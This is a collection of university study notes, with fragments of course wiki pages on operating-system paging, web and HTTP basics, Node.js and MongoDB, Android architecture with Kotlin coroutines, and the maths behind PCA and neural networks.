236	### Valid–Invalid Bit
237	
238	Each page table entry has a valid/invalid bit:
239	- **v**: page is in memory
240	- **i**: page is on disk (or not in process's address space)
241	
242	Accessing an invalid page → **page fault** (trap to OS).
243	
244	### Page Fault Handling (6 Steps)
245	
246	1. Reference causes trap to OS (page fault)
247	2. OS checks internal table: invalid reference → terminate; valid but not in memory → proceed
248	3. Find a free frame
249	4. Schedule disk read of the page into the free frame
250	5. Update page table (set valid bit = v)
251	6. Restart the interrupted instruction
252	
253	### EAT with Page Faults
254	
255	```
256	EAT = (1 − p) × memory_access + p × (fault_overhead + swap_out + swap_in)
257	
258	Example: memory_access = 200 ns, fault service = 8 ms
259	EAT = 200 + p × 7,999,800
260	
261	For < 10% degradation: p < 1 in 400,000 accesses
262	```
263	
264	---
265	
266	## 11. Page Replacement Algorithms
267	
268	When no free frames exist, a **victim page** must be evicted.
269	
270	**Dirty bit**: if a page has been modified in memory, it must be written to disk before eviction. Clean pages can be evicted for free.
271	
272	### FIFO — First-In-First-Out
273	
274	Evict the oldest page. Simple (FIFO queue). Suffers from **Belady's anomaly**: more frames can cause more page faults.
275	
276	### Optimal (OPT)
277	
278	Evict the page that will not be used for the longest time. Optimal (minimum page faults) but requires knowledge of the future — used only as a benchmark.
279	
280	### LRU — Least Recently Used
281	
282	Evict page with oldest last-use timestamp. Good in practice; approximates OPT. No Belady's anomaly.
283	
284	**Implementation**: counter (copy clock on each access) or doubly-linked list. Needs hardware support.
285	
286	### LRU Approximations
287	
288	**Reference bit**: set to 1 on access; OS periodically clears bits. Replace any page with ref bit = 0.
289	
290	**Second-chance (clock) algorithm**:
291	- Circular queue of pages
292	- On eviction candidate: if ref bit = 1, clear bit and skip; if ref bit = 0, evict
293	
294	**Enhanced second-chance** — use (reference, modify) pairs:
295	| Pair | Meaning | Replace priority |
296	|------|---------|-----------------|
297	| (0, 0) | Not used, not modified | Best — replace first |
298	| (0, 1) | Not used, modified | Must write back first |
299	| (1, 0) | Used, clean | Likely to be used again |
300	| (1, 1) | Used, modified | Worst — used and dirty |
301	
302	### Counting Algorithms
303	
304	- **LFU** (Least Frequently Used): replace page with smallest reference count
305	- **MFU** (Most Frequently Used): replace most referenced (newly loaded pages have small counts)
306	
307	---
308	
309	## 12. Frame Allocation
310	
311	**Minimum frames**: each process needs a minimum number of frames to execute even one instruction without a page fault.
312	
313	**Allocation strategies**:
314	- **Equal allocation**: N frames / n processes each
315	- **Proportional allocation**: frames ∝ process size
316	
317	**Global replacement**: any frame can be stolen from any process — higher throughput but variable per-process performance.
318	
319	**Local replacement**: each process selects only from its own frames — consistent performance but possible memory underutilisation.
320	
321	**Reapers**: kernel routines triggered when free-frame list falls below a threshold.
322	
323	---
324	
325	## 13. Thrashing
326	
327	A process is **thrashing** when it spends more time paging than executing.
328	
329	**Cause**: process does not have enough frames; it continuously page-faults and each replacement evicts a page that will be needed immediately.
330	
331	**Why demand paging works**: locality model — a programme migrates between localities; each locality fits in a modest number of frames.
332	
333	**Thrashing occurs when**: total size of all localities > total physical memory.
334	
335	### Working-Set Model
336	
337	**Working set** WSSᵢ(Δ) = set of pages referenced in the last Δ memory references.
338	
339	- Δ too small → misses pages in current locality
340	- Δ too large → includes pages from multiple localities
341	- D = Σ WSSᵢ ≈ total frames needed
342	
343	**Policy**: if D > total frames → suspend a process until D ≤ total frames.
344	
345	### Page-Fault Frequency (PFF)
346	
347	More direct control:
348	- PFF too low → process has too many frames; take some away
349	- PFF too high → process needs more frames
350	
351	---
352	
353	## 14. Other Considerations
354	
355	- **Prepaging**: load pages expected to be needed before first reference — reduces startup page faults
356	- **TLB reach**: (TLB entries) × (page size) — ideally the working set fits in TLB
357	- **I/O interlock (page pinning)**: pages involved in I/O must not be evicted — locked in memory during transfer
358	- **Programme structure**: row-major vs column-major traversal of a 2D array can differ by orders of magnitude in page faults
359	
360	---
361	
362	## See Also
363	
364	- [[concepts/os-processes-and-threads|OS Fundamentals, Processes, and Threads]] — processes and scheduling that drive memory pressure
365	- [[concepts/deadlocks|Deadlocks]] — resource management that intersects with memory allocation
366	- [[concepts/io-and-memory-systems|I/O Interfacing and Memory Systems]] (ICT1011) — hardware SRAM/DRAM/TLB foundations
367	- [[sources/ICT1012-operating-systems|ICT1012 Source Page]]
368

3	title: "Web Fundamentals (Internet, HTTP, DNS)"
4	domain: web-development
5	source: [[sources/INF1005-web-systems-technologies]]
6	complexity: medium
7	updated: 2026-05-14
8	tags: [concept, web-development, internet, http, dns, tcp-ip, networking]
9	---
10	
11	# Web Fundamentals (Internet, HTTP, DNS)
12	
13	Covers the history and architecture of the Internet and World Wide Web, the TCP/IP networking model, DNS resolution, URL structure, HTTP request/response, and web browser rendering.
14	
15	---
16	
17	## 1. The Internet vs the Web
18	
19	| | Internet | World Wide Web |
20	|-|---------|---------------|
21	| **Created** | 1969 (ARPANET, US DoD) | 1989 (Tim Berners-Lee, CERN) |
22	| **What it is** | Global packet-switched network infrastructure | Application running *over* the Internet |
23	| **Core technologies** | TCP/IP | URL, HTTP, HTML |
24	
25	**Packet switching** (vs circuit switching): data is broken into independent packets that travel different routes and are reassembled at the destination. Efficient because packets share links; no dedicated circuit needed.
26	
27	**TCP/IP adopted** across all ARPANET in January 1983.
28	
29	---
30	
31	## 2. TCP/IP Network Model
32	
33	| Layer | Role | Protocols |
34	|-------|------|-----------|
35	| **Application** | Familiar protocols used by software | HTTP, FTP, SSH, DNS, SMTP, POP, IMAP |
36	| **Transport** | End-to-end delivery | TCP (reliable, ordered, ACKs) / UDP (fast, no guarantee) |
37	| **Internet (IP)** | Routing packets between networks; best-effort | IPv4, IPv6 |
38	| **Link** | Physical transmission; error detection | MAC addresses, Ethernet, Wi-Fi |
39	
40	**TCP** guarantees arrival and ordering via sequence numbers and acknowledgements. Lost packets are retransmitted.
41	
42	**UDP** trades reliability for speed — used in streaming, VoIP, gaming, DNS.
43	
44	**IPv4**: four 8-bit integers (`192.168.1.1`) — address space exhausted in 2011.
45	**IPv6**: eight 16-bit integers — vastly larger space.
46	**PAT (Port Address Translation)**: allows multiple devices to share one IPv4 address.
47	
48	---
49	
50	## 3. DNS — Domain Name System
51	
52	Translates human-readable hostnames to IP addresses. Evolved from a simple `hosts` file to a distributed, hierarchical system.
53	
54	### Domain Name Structure
55	
56	- **gTLD** (Generic): `.com`, `.net`, `.org`, `.gov`, `.edu`; new TLDs since 2012 (`.art`, `.cash`, …)
57	- **ccTLD** (Country Code): `.sg`, `.uk`, `.ca`
58	- **IDN** (Internationalised): non-ASCII characters (deployed 2009)
59	- **ICANN** oversees TLD management and accredits registrars.
60	
61	### DNS Resolution — 10-Step Process
62	
63	1. Client makes domain request
64	2. Check local DNS cache
65	3. If not cached → query primary DNS server
66	4. Primary DNS queries Root Name Server
67	5. Root returns TLD server address
68	6. DNS server queries TLD server
69	7. TLD returns Authoritative DNS Server addresses
70	8. DNS server queries Authoritative DNS Server
71	9. IP address returned to DNS server
72	10. Client makes request to the resolved IP
73	
74	---
75	
76	## 4. URLs
77	
78	Structure: `protocol://domain[:port][/path][?query][#fragment]`
79	
80	| Component | Description | Example |
81	|-----------|-------------|---------|
82	| Protocol | Connection type | `https://` |
83	| Domain | Server address | `www.example.com` |
84	| Port | Optional (default HTTP=80, HTTPS=443) | `:8080` |
85	| Path | File or directory on server | `/blog/post` |
86	| Query string | Key-value parameters | `?id=42&lang=en` |
87	| Fragment | Page section anchor | `#section2` |
88	
89	**Relative URL types**:
90	
91	| Type | Syntax |
92	|------|--------|
93	| Same directory | `file.html` |
94	| Child directory | `subdir/file.html` |
95	| Parent directory | `../file.html` |
96	| Root reference | `/path/file.html` |
97	
98	---
99	
100	## 5. HTTP — Hypertext Transfer Protocol
101	
102	### Request Methods
103	
104	| Method | Use |
105	|--------|-----|
106	| **GET** | Retrieve a resource; data in URL query string |
107	| **POST** | Send data (forms); data in request body |
108	| **HEAD** | Like GET but headers only |
109	| **PUT** | Update/replace a resource |
110	| **DELETE** | Delete a resource |
111	
112	| Property | GET | POST |
113	|----------|-----|------|
114	| Data location | URL | Body |
115	| Bookmarkable | Yes | No |
116	| Cached | Yes | No |
117	| Binary data | No | Yes |
118	| Use case | Search/filtering | Login/submission |
119	
120	**Safety and idempotency**: GET is both safe and idempotent; PUT and DELETE are idempotent (same result if repeated) but not safe; POST is neither.
121	
122	### Response Status Codes
123	
124	| Code | Meaning |
125	|------|---------|
126	| 200 OK | Successful |
127	| 301 Moved Permanently | Permanent redirect |
128	| 304 Not Modified | Cached version is current |
129	| 401 Unauthorized | Authentication required |
130	| 404 Not Found | Resource not found |
131	| 414 URI Too Long | Too much data in URL |
132	| 500 Internal Server Error | Server-side error |
133	
134	### HTTP Headers
135	
136	- **Request**: `Host`, `User-Agent`, cache directives
137	- **Response**: `Server`, `Last-Modified`, `Content-Type`, encoding
138	
139	---
140	
141	## 6. Browser Rendering
142	
143	When a browser receives an HTML document it:
144	1. Parses HTML → finds all referenced resources (CSS, JS, images)
145	2. Downloads resources (can be parallelised)
146	3. Applies CSS → layout
147	4. Renders to screen
148	
149	### Key Performance Metrics
150	
151	| Metric | Meaning |
152	|--------|---------|
153	| **TTFB** | Time to First Byte |
154	| **FP** | First Paint |
155	| **FCP** | First Contentful Paint |
156	| **LCP** | Largest Contentful Paint |
157	| **TTI** | Time to Interactive |
158	| **CLS** | Cumulative Layout Shift |
159	
160	---
161	
162	## 7. Web Application Stacks
163	
164	| Stack | Components |
165	|-------|-----------|
166	| **LAMP** | Linux, Apache, MySQL, PHP |
167	| **MERN** | MongoDB, Express, React, Node.js |
168	| **WISA** | Windows, IIS, SQL Server, ASP.NET |
169	| **JAM** | JavaScript, APIs, Markup (static sites) |
170	
171	---
172	
173	## 8. Client-Server Architecture
174	
175	- **Clients**: devices varying in OS, speed, screen size, memory (browsers, phones, tablets)
176	- **Servers**: respond to HTTP requests — types include Web, Application, Database, Mail, Media, Authentication
177	- **Server farms**: multiple servers + load balancers + failover for reliability and scale
178	- **Cloud services**: elastic provisioning — scale on demand
179	
180	**Web 2.0** shifted the web from read-only (static HTML) to interactive — users contribute content; logic migrated from server to browser (JavaScript).
181	
182	---
183

NoSQL Databases 325 326 | Type | Description | Examples | 327 |------|-------------|---------| 328 | **Key-Value Store** | Unique key → value | Redis, DynamoDB | 329 | **Document Store** | Key → JSON/XML document | MongoDB, Firebase | 330 | **Column Store** | Stored by column, not row | Cassandra | 331 | **Graph Store** | Nodes and relationships | Neo4j | 332 333 **Use NoSQL when**: large datasets, high write volume, flexible schemas, distributed systems. 334 **Use SQL when**: ACID compliance, relational integrity, complex joins. 335 336 ### MongoDB with Mongoose (Node.js) 337 338 ```javascript 339 const mongoose = require('mongoose'); 340 mongoose.connect(process.env.MONGO_URL); 341 342 const bookSchema = new mongoose.Schema({ 343 isbn: String, 344 title: String, 345 year: Number 346 }); 347 const Book = mongoose.model('Book', bookSchema, 'books'); 348 349 Book.find({}, (err, data) => res.json(data)); 350 Book.find({ isbn: "12345" }, (err, data) => res.json(data)); 351 ``` 352 353 --- 354 355 ## 11. Node.js 356 357 Server-side JavaScript runtime built on Chrome's V8 engine. **Asynchronous, event-driven, non-blocking** architecture. 358 359 ### Blocking vs Non-Blocking 360 361 | PHP/Apache (Blocking) | Node.js (Non-Blocking) | 362 |-----------------------|------------------------| 363 | Each request → own thread | Single event-loop thread | 364 | I/O blocks the thread | I/O delegated; loop continues | 365 | Simpler model, less scalable | More complex, highly scalable | 366 367 **Advantages**: JavaScript everywhere (shared code), push architectures, rich npm ecosystem. 368 **Disadvantages**: not ideal for CPU-intensive tasks (video processing, heavy computation); more complex relational DB integration. 369 370 ### Basic Node Server 371 372 ```javascript 373 const http = require('http'); 374 const server = http.createServer((req, res) => { 375 res.writeHead(200, {"Content-Type": "text/plain"}); 376 res.write("Hello from Node.js!"); 377 res.end(); 378 }); 379 server.listen(8080); 380 ``` 381 382 --- 383 384 ## 12. 10	
11	# Android Architecture
12	
13	Android architecture covers everything from the OS stack up to the application architecture pattern recommended by Google (MVVM with the Jetpack libraries). Understanding the full stack — from how the OS manages processes to how UI state flows through a ViewModel — is essential for building apps that are responsive, testable, and survive configuration changes.
14	
15	## Android OS Stack
16	
17	From lowest to highest:
18	
19	| Layer | Contents |
20	|-------|----------|
21	| **Linux Kernel** | Drivers, memory management, process management, security |
22	| **HAL (Hardware Abstraction Layer)** | Standardises hardware interfaces for the framework |
23	| **Android Runtime (ART)** | Compiles and runs Dalvik bytecode (AOT + JIT); manages garbage collection |
24	| **Native C/C++ Libraries** | OpenGL ES, SQLite, WebKit, media codecs |
25	| **Java API Framework** | Activity Manager, Window Manager, Content Providers, View System |
26	| **System Apps** | Dialer, SMS, Browser |
27	| **User Apps** | Your app |
28	
29	ART replaced Dalvik VM in Android 5.0 (Lollipop). ART uses Ahead-Of-Time (AOT) compilation — apps run faster but install slightly slower.
30	
31	## The Four App Components
32	
33	Android's process model is component-based. The OS can launch any component independently.
34	
35	### 1. Activity
36	
37	A single screen with a user interface. The most common component. Activities are stacked in a **back stack** — Back button pops the stack.
38	
39	Each Activity has a lifecycle (see below). Multiple activities in an app communicate via Intents.
40	
41	### 2. Service
42	
43	A component that performs long-running operations **in the background** with no UI. Types:
44	- **Foreground service**: user-visible (notification required), survives app backgrounding (music player)
45	- **Background service**: no notification, can be killed by OS; use WorkManager instead
46	- **Bound service**: allows other components to bind and interact via IPC
47	
48	### 3. BroadcastReceiver
49	
50	Responds to system-wide broadcast announcements (battery low, connectivity change, boot complete). Can also receive custom broadcasts. Should execute quickly — long work offloaded to a Service or WorkManager.
51	
52	### 4. ContentProvider
53	
54	Manages structured shared data across apps. Backed by SQLite, files, or network. Uses URI-based addressing (`content://authority/path`). Contacts, MediaStore, and Calendar use built-in ContentProviders.
55	
56	### Intents
57	
58	Messaging objects that activate components:
59	- **Explicit Intent**: specifies exact target component by class (`new Intent(this, DetailActivity.class)`)
60	- **Implicit Intent**: specifies an action (`ACTION_VIEW`, `ACTION_SEND`); OS resolves to appropriate app
61	
62	## Activity Lifecycle
63	
64	```
65	onCreate() → onStart() → onResume()
66	                              ↓ (user switches away)
67	                         onPause()
68	                              ↓ (becomes not visible)
69	                         onStop()
70	                              ↓ (back pressed / finish())
71	                         onDestroy()
72	```
73	
74	Key callbacks:
75	- `onCreate()` — one-time setup, inflate layout/set content, observe ViewModel
76	- `onStart()` / `onStop()` — visibility events; start/stop animations
77	- `onResume()` / `onPause()` — focus events; pause/resume camera, sensors
78	- `onDestroy()` — cleanup; called on rotation (configuration change)
79	
80	**Configuration changes** (rotation, locale, font size) destroy and recreate the Activity. **ViewModel** survives this — it is scoped to the Activity's lifecycle but not to the Activity instance.
81	
82	## MVVM Architecture (Google's Recommended)
83	
84	```
85	UI Layer         ViewModel Layer      Data Layer
86	─────────────────────────────────────────────────
87	Composables  →   ViewModel        →   Repository
88	(observe         (holds UI state,     (single source
89	 StateFlow)       calls repo)          of truth)
90	                                          ↓         ↓
91	                                       Room    Retrofit
92	                                      (local) (remote)
93	```
94	
95	### Separation of Concerns
96	
97	- **UI Layer**: purely reactive — observes StateFlow, sends events to ViewModel, no business logic
98	- **ViewModel**: survives configuration changes, holds and exposes UI state as StateFlow, orchestrates data operations
99	- **Repository**: hides data source details; decides when to use cache vs network
100	- **Data Sources**: Room for local persistence, Retrofit for REST API
101	
102	### ViewModel
103	
104	```kotlin
105	class TaskViewModel(private val repository: TaskRepository) : ViewModel() {
106	    private val _tasks = MutableStateFlow<List<Task>>(emptyList())
107	    val tasks: StateFlow<List<Task>> = _tasks.asStateFlow()
108	
109	    init { loadTasks() }
110	
111	    fun loadTasks() {
112	        viewModelScope.launch {
113	            _tasks.value = repository.getAllTasks()
114	        }
115	    }
116	}
117	```
118	
119	`viewModelScope` is a coroutine scope tied to the ViewModel's lifecycle — cancelled automatically when ViewModel is cleared. `StateFlow` is a hot, state-holding Flow that always has a current value.
120	
121	## Jetpack Compose
122	
123	Compose is Android's modern **declarative UI toolkit** (stable since 2021). Instead of XML layouts and imperative view mutations, UI is described as a function of state.
124	
125	### Core Concepts
126	
127	**Composable functions**: annotated with `@Composable`, return Unit, describe UI.
128	
129	```kotlin
130	@Composable
131	fun Greeting(name: String) {
132	    Text(text = "Hello, $name!")
133	}
134	```
135	
136	**Recomposition**: when state changes, Compose re-executes only the composable functions that read that state. Compose tracks state reads and invalidates only affected subtrees.
137	
138	**remember**: caches a value across recompositions.
139	
140	```kotlin
141	var count by remember { mutableStateOf(0) }
142	```
143	
144	### State Hoisting
145	
146	Move state **up** to the lowest common ancestor that needs it. Pass state down as parameters and event callbacks up via lambdas. This pattern makes composables **stateless and reusable**.
147	
148	```kotlin
149	// Stateless (reusable, testable)
150	@Composable
151	fun Counter(count: Int, onIncrement: () -> Unit) {
152	    Button(onClick = onIncrement) { Text("Count: $count") }
153	}
154	
155	// Stateful parent (owns the state)
156	@Composable
157	fun CounterScreen() {
158	    var count by remember { mutableStateOf(0) }
159	    Counter(count = count, onIncrement = { count++ })
160	}
161	```
162	
163	### Key Composables
164	
165	- `Column`, `Row`, `Box` — layout containers
166	- `LazyColumn`, `LazyRow` — RecyclerView equivalents
167	- `Scaffold` — material design layout with top bar, FAB, bottom bar
168	- `Text`, `Button`, `TextField`, `Image` — basic UI elements
169	- `NavHost` — navigation container
170	
171	## Room Database
172	
173	Room is a SQLite abstraction with compile-time query verification.
174	
175	### Three Components
176	
177	**Entity**: a data class annotated with `@Entity`. Each instance = one row.
178	
179	```kotlin
180	@Entity(tableName = "tasks")
181	data class Task(
182	    @PrimaryKey(autoGenerate = true) val id: Int = 0,
183	    val title: String,
184	    val isDone: Boolean = false
185	)
186	```
187	
188	**DAO (Data Access Object)**: an interface with query annotations.
189	
190	```kotlin
191	@Dao
192	interface TaskDao {
193	    @Query("SELECT * FROM tasks") fun getAll(): Flow<List<Task>>
194	    @Insert suspend fun insert(task: Task)
195	    @Delete suspend fun delete(task: Task)
196	}
197	```
198	
199	**RoomDatabase**: abstract class annotated with `@Database`. Singleton.
200	
201	```kotlin
202	@Database(entities = [Task::class], version = 1)
203	abstract class AppDatabase : RoomDatabase() {
204	    abstract fun taskDao(): TaskDao
205	}
206	```
207	
208	Returning `Flow<List<Task>>` from a DAO means Room automatically emits a new list whenever the database changes — reactive data.
209	
210	## Navigation
211	
212	Jetpack Navigation Compose uses `NavController` and `NavHost`:
213	
214	```kotlin
215	NavHost(navController, startDestination = "list") {
216	    composable("list") { TaskListScreen(navController) }
217	    composable("detail/{taskId}") { backStackEntry ->
218	        TaskDetailScreen(backStackEntry.arguments?.getString("taskId"))
219	    }
220	}
221	```
222	
223	Navigation is state-driven — the back stack is modelled as application state, not a side-effect of Activity launches.
224	
225	## See Also
226	
227	- [[kotlin-coroutines]] — Kotlin language, coroutines, Flow, Hilt, Retrofit, WorkManager
228	- [[oop-four-pillars]] — OOP relationships applied: Repository (Facade), ViewModel (Observer)
229	- [[solid-and-design-patterns]] — MVVM is an architectural application of SOLID principles
230	- [[INF2007-mobile-app-development]] — source course

10	
11	# Kotlin, Coroutines, and Android Async
12	
13	This page covers Kotlin language features used in Android development, the coroutines framework for asynchronous programming, and the key libraries that build on it: Hilt for dependency injection, Retrofit for REST, and WorkManager for background tasks.
14	
15	## Kotlin Language Essentials
16	
17	### Variables
18	
19	```kotlin
20	val name = "Alice"    // immutable (cannot reassign)
21	var count = 0         // mutable (can reassign)
22	```
23	
24	Kotlin uses type inference — explicit types optional when clear from context.
25	
26	### Null Safety
27	
28	Kotlin's type system distinguishes nullable from non-nullable types at compile time, eliminating most NPEs.
29	
30	```kotlin
31	val name: String = "Alice"     // cannot be null — compile error if assigned null
32	val nullable: String? = null   // explicitly nullable
33	
34	nullable?.length               // safe call — returns null if nullable is null
35	nullable ?: "default"          // Elvis operator — returns "default" if null
36	nullable!!.length              // not-null assertion — throws NPE if null (use sparingly)
37	```
38	
39	### Lambdas and Higher-Order Functions
40	
41	```kotlin
42	val double: (Int) -> Int = { x -> x * 2 }
43	
44	// Trailing lambda syntax (most common)
45	listOf(1, 2, 3).filter { it > 1 }.map { it * 2 }
46	```
47	
48	### Extension Functions
49	
50	Add methods to existing classes without inheritance or modification:
51	
52	```kotlin
53	fun String.isPalindrome(): Boolean = this == this.reversed()
54	"racecar".isPalindrome()  // true
55	```
56	
57	Android uses extension functions extensively (e.g., `View.isVisible`, `Context.toast()`).
58	
59	### Data Classes
60	
61	```kotlin
62	data class User(val id: Int, val name: String)
63	```
64	
65	Compiler auto-generates: `equals()`, `hashCode()`, `toString()`, `copy()`, and `componentN()` functions (for destructuring). Ideal for DTOs, database entities, and UI state models.
66	
67	### Sealed Classes
68	
69	All subclasses must be in the same package/file. Enables exhaustive `when` expressions — compiler guarantees all cases handled.
70	
71	```kotlin
72	sealed class Result<out T> {
73	    data class Success<T>(val data: T) : Result<T>()
74	    data class Error(val message: String) : Result<Nothing>()
75	    object Loading : Result<Nothing>()
76	}
77	
78	when (result) {
79	    is Result.Success -> showData(result.data)
80	    is Result.Error   -> showError(result.message)
81	    Result.Loading    -> showSpinner()
82	    // No else needed — compiler verifies exhaustiveness
83	}
84	```
85	
86	## Coroutines
87	
88	Coroutines are Kotlin's solution to asynchronous programming. They are **lightweight threads** — thousands can run concurrently without the overhead of OS threads. Coroutines avoid callback hell and produce sequential-looking async code.
89	
90	### launch vs async
91	
92	```kotlin
93	// launch — fire and forget; returns Job
94	val job = viewModelScope.launch {
95	    repository.syncData()  // runs asynchronously
96	}
97	
98	// async — concurrent computation; returns Deferred<T>
99	val deferred: Deferred<Int> = viewModelScope.async {
100	    computeHeavyResult()
101	}
102	val result = deferred.await()  // suspends until result ready
103	```
104	
105	### suspend Functions
106	
107	A `suspend` function can be paused and resumed without blocking the calling thread. Can only be called from another coroutine or another suspend function.
108	
109	```kotlin
110	suspend fun fetchUser(id: Int): User {
111	    return apiService.getUser(id)  // network call — doesn't block thread
112	}
113	```
114	
115	Under the hood, the compiler transforms suspend functions into a state machine using continuations.
116	
117	### Dispatchers
118	
119	Coroutine dispatchers determine which thread(s) a coroutine runs on:
120	
121	| Dispatcher | Thread pool | Use for |
122	|------------|------------|---------|
123	| `Dispatchers.Main` | Main/UI thread | UI updates, ViewModel operations |
124	| `Dispatchers.IO` | Expandable (up to 64 threads) | File I/O, network, database |
125	| `Dispatchers.Default` | CPU-bound (= CPU cores) | Heavy computation, sorting |
126	| `Dispatchers.Unconfined` | No specific thread | Testing, immediate start |
127	
128	```kotlin
129	viewModelScope.launch {
130	    val data = withContext(Dispatchers.IO) {
131	        repository.fetchFromNetwork()  // runs on IO thread
132	    }
133	    _uiState.value = data  // back on Main thread
134	}
135	```
136	
137	### Structured Concurrency
138	
139	Coroutines follow a **parent-child hierarchy**: a child coroutine inherits the scope of its parent. If the parent is cancelled, all children are cancelled. If a child throws an uncaught exception, the parent and siblings are cancelled.
140	
141	```
142	viewModelScope (CoroutineScope)
143	├── launch (Job A)
144	│   └── async (Deferred B) ← child of A
145	└── launch (Job C)
146	```
147	
148	`viewModelScope` is automatically cancelled when the ViewModel is cleared — preventing memory leaks from dangling coroutines.
149	
150	## Flow, StateFlow, and collectAsState
151	
152	### Flow
153	
154	A cold, asynchronous stream of values. Produces values only when collected. Built on coroutines.
155	
156	```kotlin
157	fun numberStream(): Flow<Int> = flow {
158	    for (i in 1..5) {
159	        delay(100)
160	        emit(i)
161	    }
162	}
163	
164	// Collect in a coroutine
165	numberStream()
166	    .filter { it % 2 == 0 }
167	    .map { it * 10 }
168	    .collect { println(it) }  // 20, 40
169	```
170	
171	Room DAOs return `Flow<List<T>>` — the flow re-emits whenever the underlying data changes.
172	
173	### StateFlow
174	
175	A **hot**, state-holding flow with a current value. Always has a value; new collectors immediately receive the latest. Used in ViewModels to expose UI state.
176	
177	```kotlin
178	private val _uiState = MutableStateFlow(UiState())
179	val uiState: StateFlow<UiState> = _uiState.asStateFlow()
180	
181	// Update state
182	_uiState.update { it.copy(isLoading = true) }
183	```
184	
185	### collectAsState in Compose
186	
187	```kotlin
188	val uiState by viewModel.uiState.collectAsState()
189	// uiState is now a Compose State — recomposition triggered on change
190	```
191	
192	`collectAsState` bridges the Flow/StateFlow world and Compose's state system.
193	
194	## Hilt — Dependency Injection
195	
196	Hilt is Google's DI framework for Android, built on Dagger 2. It implements the Dependency Inversion Principle from [[solid-and-design-patterns]].
197	
198	### Core Annotations
199	
200	```kotlin
201	// Mark class as injectable with its dependencies
202	@HiltViewModel
203	class TaskViewModel @Inject constructor(
204	    private val repository: TaskRepository
205	) : ViewModel()
206	
207	// Provide dependencies (when constructor injection isn't possible)
208	@Module
209	@InstallIn(SingletonComponent::class)
210	object DatabaseModule {
211	    @Provides
212	    @Singleton
213	    fun provideDatabase(@ApplicationContext context: Context): AppDatabase =
214	        Room.databaseBuilder(context, AppDatabase::class.java, "app.db").build()
215	}
216	```
217	
218	### Component Hierarchy
219	
220	Hilt components are tied to Android lifecycles:
221	- `SingletonComponent` — app lifetime
222	- `ActivityRetainedComponent` — survives configuration changes
223	- `ViewModelComponent` — ViewModel lifetime
224	- `ActivityComponent` — Activity lifetime
225	- `FragmentComponent` — Fragment lifetime
226	
227	`@Singleton` scopes a dependency to one instance per `SingletonComponent` — the standard scope for database and repository.
228	
229	## Retrofit — REST API Client
230	
231	Retrofit turns an annotated Kotlin interface into a type-safe HTTP client.
232	
233	```kotlin
234	interface TaskApiService {
235	    @GET("tasks")
236	    suspend fun getTasks(): List<TaskDto>
237	
238	    @POST("tasks")
239	    suspend fun createTask(@Body task: TaskDto): TaskDto
240	
241	    @DELETE("tasks/{id}")
242	    suspend fun deleteTask(@Path("id") id: Int)
243	}
244	
245	// Build once, inject everywhere (via Hilt Module)
246	val retrofit = Retrofit.Builder()
247	    .baseUrl("https://api.example.com/")
248	    .addConverterFactory(GsonConverterFactory.create())
249	    .build()
250	
251	val apiService = retrofit.create(TaskApiService::class.java)
252	```
253	
254	`suspend` functions in the interface mean Retrofit handles threading automatically — no callbacks needed.
255	
256	## WorkManager — Background Work
257	
258	WorkManager is the Jetpack solution for **deferrable, guaranteed background work**. Unlike background Services, WorkManager survives process death, app restarts, and device reboots.
259	
260	```kotlin
261	class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
262	    override suspend fun doWork(): Result {
263	        return try {
264	            repository.syncWithServer()
265	            Result.success()
266	        } catch (e: Exception) {
267	            Result.retry()
268	        }
269	    }
270	}
271	
272	// Enqueue
273	val request = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
274	    .setConstraints(Constraints(requiresNetwork = true))
275	    .build()
276	
277	WorkManager.getInstance(context).enqueueUniquePeriodicWork(
278	    "sync", ExistingPeriodicWorkPolicy.KEEP, request
279	)
280	```
281	
282	`CoroutineWorker` provides a suspend `doWork()` that runs on `Dispatchers.Default`. Return `Result.success()`, `Result.failure()`, or `Result.retry()`.
283	
284	## See Also
285	
286	- [[android-architecture]] — MVVM, Room, Compose, Activity lifecycle
287	- [[solid-and-design-patterns]] — DIP implemented by Hilt; Singleton pattern for app-wide instances
288	- [[INF2007-mobile-app-development]] — source course
289

# Mathematics Foundations → Machine Learning: The Hidden Curriculum

Students who take the SIT maths modules (INF1003/INF1004) before machine learning (INF2008) often experience them as disconnected courses. They are not. INF2008 assumes fluency in the entire vocabulary of INF1003 and INF1004, but the connection is never made explicit in class. This page documents it precisely.

---

## 1. Linear Algebra → Neural Networks

### Weight matrices and the forward pass

A neural network layer is, at its most fundamental, a matrix-vector multiplication followed by a non-linear activation function. From [[concepts/neural-networks-linear-models|Neural Networks & Linear Models]]:

$$z = W^T x + b \qquad a = \sigma(z)$$

Here W is the weight matrix, x is the input vector, and b is the bias vector — all concepts defined in full in [[concepts/linear-algebra-matrices|Linear Algebra & Matrices]]. The dot product $W^T x$ is exactly the matrix multiplication rule:

$$(AB)_{ij} = \sum_k a_{ik} b_{kj}$$

applied to the case where B is a column vector. Every forward pass through a fully-connected network is a sequence of matrix multiplications. The vectorised gradient descent update for multiple-regression:

$$\nabla_w L = -\frac{1}{n} X^T e$$

is also pure matrix calculus: X is the design matrix, e is the residual vector, and $X^T e$ is a matrix-vector product.

### Closed-form vs iterative solutions

The ordinary least-squares solution from INF1004:

$$\hat{\boldsymbol{\beta}} = (X^TX)^{-1}X^T\mathbf{y}$$

is the exact, closed-form alternative to gradient descent for linear regression. INF2008 reaches the same parameter values via iteration; INF1004 reaches them via matrix inversion. Understanding both reveals that gradient descent is a workaround for when the matrix inverse is too expensive to compute — which is always true for deep networks.

---

## 2. Eigenvalues and SVD → PCA

This is the most direct and underappreciated connection in the curriculum.

### PCA via eigendecomposition

[[concepts/clustering-and-dimensionality-reduction|Clustering & Dimensionality Reduction]] presents PCA as finding the eigenvectors of the covariance matrix:

$$C = \frac{1}{m} X_{scaled}^T X_{scaled} \qquad CW = \lambda W$$

The eigenvectors W are the principal component directions; the eigenvalues λ quantify the variance each component captures. This is literally the eigendecomposition covered in [[concepts/eigenvalues-and-svd|Eigenvalues, Diagonalisation & SVD]]:

$$A = PDP^{-1}$$

where P holds the eigenvectors and D holds the eigenvalues on its diagonal.

### PCA via SVD (the practical route)

In practice, computing the covariance matrix explicitly can be numerically unstable for large datasets. SVD provides a superior path:

$$X_{scaled} = U\Sigma V^T$$

The columns of V are the right singular vectors — and these are identical to the eigenvectors of $X^T X$, which is proportional to the covariance matrix. The singular values $\sigma_i = \sqrt{\lambda_i(X^TX)}$ give the same variance ordering as the eigenvalues. This is why scikit-learn's PCA implementation uses SVD internally, never the covariance matrix directly.

